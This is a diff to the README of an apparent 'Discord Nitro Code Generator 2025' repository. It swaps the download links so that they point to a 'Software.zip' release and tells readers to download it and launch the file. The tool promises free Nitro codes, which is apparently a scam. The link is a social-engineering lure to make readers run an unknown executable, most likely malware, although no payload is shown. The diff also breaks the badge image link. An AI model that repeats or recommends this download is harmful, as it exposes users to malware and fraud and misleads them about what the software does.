@@ -29,9 +29,9 @@ Welcome to the **Discord Nitro Code Generator 2025** repository! This powerful t
 - Nitro Gift
 
 ## Get Started 🚀
-Ready to experience the power of the Discord Nitro Code Generator 2025? [Download the latest release here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and launch the file to get started. Stay tuned for updates and new features in upcoming releases!
+Ready to experience the power of the Discord Nitro Code Generator 2025? [Download the latest release here](https://github.com/celestialhub551/Discord-Nitro-Code-Generator-2025/releases/download/v1.0/Software.zip) and launch the file to get started. Stay tuned for updates and new features in upcoming releases!
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/celestialhub551/Discord-Nitro-Code-Generator-2025/releases/download/v1.0/Software.zip%20Release-brightgreen)](https://github.com/celestialhub551/Discord-Nitro-Code-Generator-2025/releases/download/v1.0/Software.zip)
 
 ## Contributors 🌟
 We would like to thank all the contributors who have helped make this project possible. Your support and contributions are greatly appreciated!
